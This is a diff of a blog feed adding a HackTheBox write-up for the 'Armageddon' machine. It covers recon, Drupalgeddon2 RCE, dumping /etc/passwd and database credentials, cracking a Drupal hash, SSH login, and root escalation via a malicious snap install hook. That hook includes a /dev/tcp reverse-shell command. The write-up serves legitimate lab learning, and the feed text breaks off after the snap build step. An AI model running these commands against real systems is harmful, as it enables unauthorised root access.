@@ -1,4 +1,218 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-04-25T14:33:44+02:00</updated><id>/feed.xml</id><title type="html">CTF Writeups &amp;amp; Tech Stuff</title><subtitle>HTB Writeups and other techhie stuff</subtitle><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><entry><title type="html">HTB Writeup - Bucket</title><link href="/posts/HTB-Writeup-Bucket" rel="alternate" type="text/html" title="HTB Writeup - Bucket" /><published>2021-04-25T13:40:00+02:00</published><updated>2021-04-25T13:40:00+02:00</updated><id>/posts/HTB-Writeup:-Bucket</id><content type="html" xml:base="/posts/HTB-Writeup-Bucket">&lt;p&gt;&lt;img src=&quot;/assets/images/3f07dd46f3ff7d287d2f736b18c6ded7.png&quot; alt=&quot;3f07dd46f3ff7d287d2f736b18c6ded7&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-05-10T23:17:07+02:00</updated><id>/feed.xml</id><title type="html">CTF Writeups &amp;amp; Tech Stuff</title><subtitle>HTB Writeups and other techhie stuff</subtitle><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><entry><title type="html">HTB Writeup - Armageddon</title><link href="/posts/HTB-Writeup-Armageddon" rel="alternate" type="text/html" title="HTB Writeup - Armageddon" /><published>2021-05-09T23:20:00+02:00</published><updated>2021-05-09T23:20:00+02:00</updated><id>/posts/HTB-Writeup:-Armageddon</id><content type="html" xml:base="/posts/HTB-Writeup-Armageddon">&lt;p&gt;Write up for the easy-rated HTB box &lt;strong&gt;Armageddon&lt;/strong&gt;, completed on May 9th 2021. Fairly straightforward machine if you know where to look; 80% of the time spent here was on trying to do “optional” steps.&lt;/p&gt;
+
+&lt;p&gt;Note that I try to write up my complete process and not only the straight way to get the flags, including errors and time-wasters, which I see as opportunity to learn instead of giving the straight up solution every time.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;p&gt;We start with standard &lt;strong&gt;nmap&lt;/strong&gt; initial enumeration by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sC -sV -oA nmap/armageddon 10.10.10.233&lt;/code&gt;, which gives us:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-04-25 18:41 CEST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.233
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.032s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| http-robots.txt: 36 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16
+|_http-title:  Armageddon
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;9.76 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Out of this scan we gain the following information:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Target is running CentOS&lt;/li&gt;
+  &lt;li&gt;We are dealing with a web serer mostly on port 80, with &lt;strong&gt;Drupal&lt;/strong&gt; CMS.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; is found.&lt;/li&gt;
+  &lt;li&gt;We also have a SSH service going on.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We start a full namp scan in the background and start poking around the web page.&lt;/p&gt;
+
+&lt;h3 id=&quot;web-recon---80&quot;&gt;Web Recon - 80&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425185006.png&quot; alt=&quot;Pasted image 20210425185006&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At first view, the site is very basic. We go straight away to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file found by nmap, which shows a lot of disallowed/allowed location, which are most likely automatically generated on any Drupal install, however one entry stands out:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CHANGELOG.txt&lt;/code&gt; file is usually a good way to find exactly which version we are dealing with. Before going any further we start in the background a &lt;strong&gt;gobuster&lt;/strong&gt; reconnaissance on the root of the server just in case. Further looking at the changelog, we can now see that we are dealing with &lt;strong&gt;Drupal 7.56&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425185818.png&quot; alt=&quot;Pasted image 20210425185818&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Which is severely outdated; released in 2017-06 and this box is being done on 2021-05. Not surprising that we can find exploit for this version in &lt;strong&gt;ExploitDB&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425231735.png&quot; alt=&quot;Pasted image 20210425231735&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we now attempt to run those exploit in order to achieve RCE.&lt;/p&gt;
+
+&lt;h2 id=&quot;drupal-exploitation&quot;&gt;Drupal Exploitation&lt;/h2&gt;
+
+&lt;p&gt;In the exploit search results we have, we first see that the latest, &lt;strong&gt;Drupalgeddon3&lt;/strong&gt;, requires authentication. We go back to the site and attempt creating a user, but with no success:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425232303.png&quot; alt=&quot;Pasted image 20210425232303&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;:information_source: &lt;em&gt;META: Always a good sign we are on the right path when the theme of the exploit is matching the name of the machine.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;rce---drupalgeddon2&quot;&gt;RCE - Drupalgeddon2&lt;/h3&gt;
+
+&lt;p&gt;We start looking in &lt;strong&gt;Drupalgeddon2&lt;/strong&gt; which is also available; from reading its POC, it looks like we may be able to exploit the service without authentication&lt;/p&gt;
+
+&lt;p&gt;Running the exploit with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby exploit.rb 10.10.10.233&lt;/code&gt; succeeds and we now have RCE as the user &lt;strong&gt;apache&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425233713.png&quot; alt=&quot;Pasted image 20210425233713&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Important to note that this is actually a shell, rather the exploit wrote a php file on the server which will execute whichever command we POST to it.&lt;/p&gt;
+
+&lt;h3 id=&quot;extracting-information&quot;&gt;Extracting Information&lt;/h3&gt;
+
+&lt;p&gt;With the limited RCE capabilities we landed, we now try to get some additional information about the target. Always a good idea to start by looking at the service you’ve just exploited, so we go look at the Drupal’s configuration file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sites/default/settings.php &lt;/code&gt; and find some &lt;strong&gt;MySQL&lt;/strong&gt; credentials in it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210502185422.png&quot; alt=&quot;Pasted image 20210502185422&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We also dump the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; content:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aside from root, the only user with a shell would be &lt;strong&gt;brucetherealadmin&lt;/strong&gt;, which we take note of. Since we just got MySQL credentials, we target this service next. The limited shell does not let us entering an interactive shell session with &lt;strong&gt;mysql&lt;/strong&gt;, so we need to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; flag to execute commands while giving our credentials:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210507000808.png&quot; alt=&quot;Pasted image 20210507000808&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drupal&lt;/code&gt; database, we dump the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; table:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;armageddon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupaluser'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--password=CQHEy@9M*m23gBVj -e &quot;use drupal; select * from users&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;theme&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;signature_format&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;created&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;access&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;timezone&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;language&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;picture&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;data&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                                               &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;               &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;brucetherealadmin&lt;/span&gt;       &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oOsUf1xAhaadURt&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;armageddon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eu&lt;/span&gt;                     &lt;span class=&quot;n&quot;&gt;filtered_html&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;1606998756&lt;/span&gt;      &lt;span class=&quot;mi&quot;&gt;1607077194&lt;/span&gt;      &lt;span class=&quot;mi&quot;&gt;1607076276&lt;/span&gt;      &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;Europe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;London0&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;armageddon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eu&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;overlay&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So here we find a matching hash &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&lt;/code&gt; for the same user as above. Next to crack this hash, we verify it’s type, which according to &lt;strong&gt;hashcat&lt;/strong&gt; documentation matches to the Drupal7 format:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210507001543.png&quot; alt=&quot;Pasted image 20210507001543&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using this mode against the &lt;strong&gt;rockyou.txt&lt;/strong&gt; list, we manage to crack the hash which gives us the password &lt;strong&gt;booboo&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;We immediately try the credentials &lt;strong&gt;brucetherealadmin:booboo&lt;/strong&gt; on the &lt;strong&gt;ssh&lt;/strong&gt; service and we get a shell as brucetherealadmin.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210507195140.png&quot; alt=&quot;Pasted image 20210507195140&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;shell---brucetherealadmin&quot;&gt;Shell - brucetherealadmin&lt;/h2&gt;
+
+&lt;p&gt;Now on the box as &lt;strong&gt;brucetherealadmin&lt;/strong&gt;, we are able to get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; flag :white_flag:. ​&lt;/p&gt;
+
+&lt;p&gt;We proceed with standard user enumeration:&lt;/p&gt;
+
+&lt;h3 id=&quot;open-ports&quot;&gt;Open Ports&lt;/h3&gt;
+
+&lt;p&gt;A quick check for open ports shows:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-tunlp&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;No info could be &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-p&quot;&lt;/span&gt;: geteuid&lt;span class=&quot;o&quot;&gt;()=&lt;/span&gt;1000 but you should be root.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Active Internet connections &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;only servers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -           
+tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -           
+tcp        0      0 127.0.0.1:25            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -           
+tcp6       0      0 :::80                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -           
+tcp6       0      0 :::22                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -           
+tcp6       0      0 ::1:25                  :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -      
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nothing new here, except we notice a &lt;strong&gt;SMTP&lt;/strong&gt; server seem to be running locally. Aside from taking notes of this we move on to additional enumeration.&lt;/p&gt;
+
+&lt;h3 id=&quot;sudo-permissions&quot;&gt;Sudo Permissions&lt;/h3&gt;
+
+&lt;p&gt;Given we authenticated with password, we check for the results of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; which gives is:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;brucetherealadmin on armageddon:
+    &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/snap &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We definitively have something interesting here; we are allowed to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snap install&lt;/code&gt; as &lt;strong&gt;sudo&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escalation---snap&quot;&gt;Escalation - Snap&lt;/h3&gt;
+
+&lt;p&gt;Looking at &lt;a href=&quot;https://gtfobins.github.io/gtfobins/snap/&quot;&gt;&lt;strong&gt;GTFOBins&lt;/strong&gt;&lt;/a&gt;, we can see there is a way to execute commands as root:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;COMMAND&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+cd&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; meta/hooks
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/sh\n%s; false'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$COMMAND&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;meta/hooks/install
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x meta/hooks/install
+fpm &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; xxxx &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; snap &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; all meta
+
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snap &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;xxxx_1.0_all.snap &lt;span class=&quot;nt&quot;&gt;--dangerous&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--devmode&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Trying out this same POC, we confirm we are able to execute as root:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210509230422.png&quot; alt=&quot;Pasted image 20210509230422&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We simply need to forge a different payload to send us back a reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; meta/hooks
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/sh\n%s; false'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.2/9001 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;meta/hooks/install
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x meta/hooks/install
+fpm &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; rev1 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; snap &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; all meta
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
